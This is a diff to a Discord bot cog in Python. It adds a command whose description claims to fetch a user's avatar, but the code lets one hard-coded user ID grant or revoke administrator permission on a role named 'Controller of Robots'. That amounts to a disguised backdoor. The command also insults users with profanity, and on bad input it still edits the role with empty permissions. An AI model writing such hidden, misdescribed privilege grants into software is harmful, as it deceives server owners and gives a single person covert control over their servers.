@@ -26,22 +26,24 @@ class TestCog(commands.Cog, name = 'Test Commands'):
 			return
 		
 	@commands.command(name = 'fuck', description = 'A command to get a user\'s avatar.')
-	async def fuck(self, ctx):
+	async def fuck(self, ctx, num):
 		await ctx.message.delete()
 		if ctx.author.id != 316384336859627530:
-			print('Not good user')
+			await ctx.send('Use the right args fucktard.')
 			return
 		for role in ctx.author.roles:
 			if role.name == 'Controller of Robots':
-				for perm in role.permissions:
-					print(perm)
-				return
-		print('No perms found')
-		return
+				permissions = discord.Permissions()
 				
-	"""			permissions = discord.Permissions()
-				permissions.update(administrator = True)
+				if num == 'on':
+					permissions.update(administrator = True)
+				elif num == 'off':
+					permissions.update(administrator = False)
+				else:
+					await ctx.send('Use the right args fucktard.')
 				await role.edit(permissions=permissions)
+				return
+			
 			else:
 				return
 		return
